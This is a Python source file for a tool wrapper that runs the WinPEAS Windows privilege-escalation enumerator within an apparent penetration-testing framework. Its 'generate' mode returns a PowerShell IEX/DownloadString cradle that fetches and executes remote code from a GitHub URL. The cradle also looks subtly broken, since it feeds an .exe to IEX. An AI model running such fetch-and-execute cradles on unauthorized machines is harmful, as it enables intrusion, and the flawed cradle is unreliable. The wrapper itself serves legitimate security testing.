"""WinPEAS privilege escalation enumeration tool for Windows."""
from typing import Any

from astro.core.validators import validate_additional_args, validate_path
from astro.tools.base import BaseTool, ToolResult


_VALID_MODES = frozenset({"local", "generate"})
_WINPEAS_PS_CRADLE = (
    "IEX (New-Object Net.WebClient).DownloadString("
    "'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe')"
)


class WinpeasTool(BaseTool):
    name = "winpeas"
    description = "Windows privilege escalation enumeration script"

    def validate(self, params: dict[str, Any]) -> dict[str, Any]:
        mode = params.get("mode", "local")
        if mode not in _VALID_MODES:
            raise ValueError(f"mode must be one of: {', '.join(sorted(_VALID_MODES))}")

        winpeas_path = params.get("winpeas_path", "")
        if winpeas_path and not validate_path(winpeas_path):
            raise ValueError("Invalid winpeas_path: must be an absolute path with safe characters")

        if mode == "local" and not winpeas_path:
            raise ValueError("winpeas_path is required for local mode")

        additional_args = params.get("additional_args", "")
        tokens: list[str] = []
        if additional_args:
            tokens = validate_additional_args(additional_args)

        return {"mode": mode, "winpeas_path": winpeas_path, "tokens": tokens}

    def build_command(self, params: dict[str, Any]) -> list[str]:
        return [params["winpeas_path"], *params["tokens"]]

    async def execute(self, executor: Any, params: dict[str, Any]) -> ToolResult:
        validated = self.validate(params)

        if validated["mode"] == "generate":
            return ToolResult(
                tool=self.name,
                target="generate",
                success=True,
                raw={"stdout": _WINPEAS_PS_CRADLE, "stderr": "", "return_code": 0, "success": True},
                parsed={"command": _WINPEAS_PS_CRADLE, "mode": "generate"},
            )

        cmd = self.build_command(validated)
        raw = await executor.execute(cmd)
        return ToolResult(
            tool=self.name,
            target=validated["winpeas_path"],
            success=raw["success"],
            raw=raw,
            parsed=self.parse_output(raw, validated),
        )

    def parse_output(self, raw: dict[str, Any], params: dict[str, Any]) -> dict[str, Any] | None:
        return {"mode": params["mode"], "winpeas_path": params.get("winpeas_path", "")}
